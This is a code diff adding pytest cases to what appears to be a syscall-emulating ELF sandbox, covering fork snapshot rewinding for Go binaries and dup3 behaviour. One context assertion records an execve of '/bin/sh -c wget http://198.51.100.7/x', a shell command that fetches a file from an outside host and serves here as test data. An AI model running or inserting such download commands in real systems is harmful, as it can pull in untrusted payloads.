@@ -390,3 +390,37 @@ def test_vfork_style_clone_without_clone_thread_runs_the_child_then_the_parent()
     execve = next(e for e in r.events if e["syscall"] == "execve")
     assert execve["argv"] == ["/bin/sh", "-c", "wget http://198.51.100.7/x"]
     assert struct.unpack("<Q", r.stdout)[0] == 1001 and r.stop_reason == "exit(0)"
+
+
+def test_rewind_keeps_parent_memory_the_fork_snapshot_did_not_copy(monkeypatch):
+    """A Go binary's address space outgrows the snapshot cap; its heap/stack at 0xc000000000
+    sorts last, so it is the part left uncopied. Rewinding must not unmap it."""
+    from elfsim_service import kernel
+    monkeypatch.setattr(kernel, "MAX_SNAPSHOT_BYTES", 0)       # copy nothing: every region is "too big"
+    p = X64Prog()
+    slot = p.d(b"\0" * 8)
+    p.call("fork")
+    p.jnz("parent")
+    p.exit(0)
+    p.label("parent")
+    p.store_rax(slot)
+    p.call("write", 1, slot, 8)
+    p.exit(0)
+    r = _run(p)
+    assert r.error is None and r.stop_reason == "exit(0)"
+    assert struct.unpack("<Q", r.stdout)[0] == 1001
+
+
+def test_dup3_duplicates_like_dup2_but_rejects_the_same_fd():
+    """Go's os/exec child dup3()s its pipes onto 0-2 before execve; ENOSYS made it give up."""
+    p = X64Prog()
+    msg, slot = p.d(b"hi"), p.d(b"\0" * 8)
+    p.call("dup3", 1, 1, 0)
+    p.store_rax(slot)
+    p.call("dup3", 1, 5, 0)
+    p.call("write", 5, msg, 2)
+    p.call("write", 1, slot, 8)
+    p.exit(0)
+    r = _run(p)
+    assert r.stdout == b"hi" + struct.pack("<q", -22)       # -EINVAL
+    assert r.unknown_syscalls == {}
